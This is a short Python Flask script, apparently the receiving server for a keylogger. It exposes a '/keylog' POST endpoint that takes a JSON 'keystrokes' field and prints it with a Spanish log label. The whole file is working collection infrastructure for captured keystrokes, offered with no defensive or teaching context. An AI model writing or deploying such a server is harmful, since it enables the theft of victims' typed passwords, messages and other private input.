from flask import Flask, request

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.json
    print("Registro recibido:", data.get("keystrokes"))
    return '', 200

if __name__ == '__main__':
    app.run(port=5000)